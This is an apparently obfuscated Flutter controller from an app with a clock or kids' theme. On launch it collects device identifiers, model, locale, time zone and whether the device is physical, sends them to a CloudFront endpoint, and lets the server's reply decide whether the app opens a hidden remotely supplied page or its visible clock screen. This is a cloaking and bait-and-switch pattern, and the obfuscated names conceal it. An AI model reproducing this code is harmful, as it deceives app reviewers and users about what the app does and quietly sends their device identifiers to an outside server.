import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class KiddyFrameMindLogic extends GetxController {

  var wfzupghck = RxBool(false);
  var jnemxugk = RxBool(true);
  var cujy = RxString("");
  var fvau = RxBool(false);
  var lxigmoj = RxBool(true);
  final gbenczxsq = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    kzpfvl();
  }


  Future<void> kzpfvl() async {
    fvau.value = true;
    lxigmoj.value = true;
    jnemxugk.value = false;

    gbenczxsq.post("https://d2k0rkrmf1k1wz.cloudfront.net/Nho7aHwPe5Mn?no_check",data: await ezpqdxro()).then((value) {
      var nuhopr = value.data["nuhopr"] as String;
      var flruozex = value.data["flruozex"] as bool;
      if (flruozex) {
        cujy.value = nuhopr;
        dhczugix();
      } else {
        umiaey();
      }
    }).catchError((e) {
      jnemxugk.value = true;
      lxigmoj.value = true;
      fvau.value = false;
    });
  }

  Future<Map<String, dynamic>> ezpqdxro() async {
    final DeviceInfoPlugin pxbetqiy = DeviceInfoPlugin();
    PackageInfo gjzlsch_tyshi = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ycfhu = Platform.localeName;
    var yxPzwec = currentTimeZone;

    var MOSET = gjzlsch_tyshi.packageName;
    var qiGEt = gjzlsch_tyshi.version;
    var lvjk = gjzlsch_tyshi.buildNumber;

    var VpFtvJ = gjzlsch_tyshi.appName;
    var krhJnf = "";
    var DjqdMT  = "";
    var efIZWby = "";
    var ixjvcez = "";
    var gkdn = "";
    var yfdsca = "";
    var xhdsgv = "";
    var ouhsif = "";


    var tbyTOBM = "";
    var dPCNk = false;

    if (GetPlatform.isAndroid) {
      tbyTOBM = "android";
      var ohygslke = await pxbetqiy.androidInfo;

      efIZWby = ohygslke.brand;

      krhJnf  = ohygslke.model;
      DjqdMT = ohygslke.id;

      dPCNk = ohygslke.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      tbyTOBM = "ios";
      var bmnksj = await pxbetqiy.iosInfo;
      efIZWby = bmnksj.name;
      krhJnf = bmnksj.model;

      DjqdMT = bmnksj.identifierForVendor ?? "";
      dPCNk  = bmnksj.isPhysicalDevice;
    }

    var res = {
      "VpFtvJ": VpFtvJ,
      "lvjk": lvjk,
      "qiGEt": qiGEt,
      "ixjvcez" : ixjvcez,
      "MOSET": MOSET,
      "krhJnf": krhJnf,
      "yxPzwec": yxPzwec,
      "efIZWby": efIZWby,
      "DjqdMT": DjqdMT,
      "ycfhu": ycfhu,
      "tbyTOBM": tbyTOBM,
      "dPCNk": dPCNk,
      "gkdn" : gkdn,
      "yfdsca" : yfdsca,
      "xhdsgv" : xhdsgv,
      "ouhsif" : ouhsif,

    };
    return res;
  }

  Future<void> umiaey() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> dhczugix() async {
    Get.offNamed("/Outreload");
  }

}
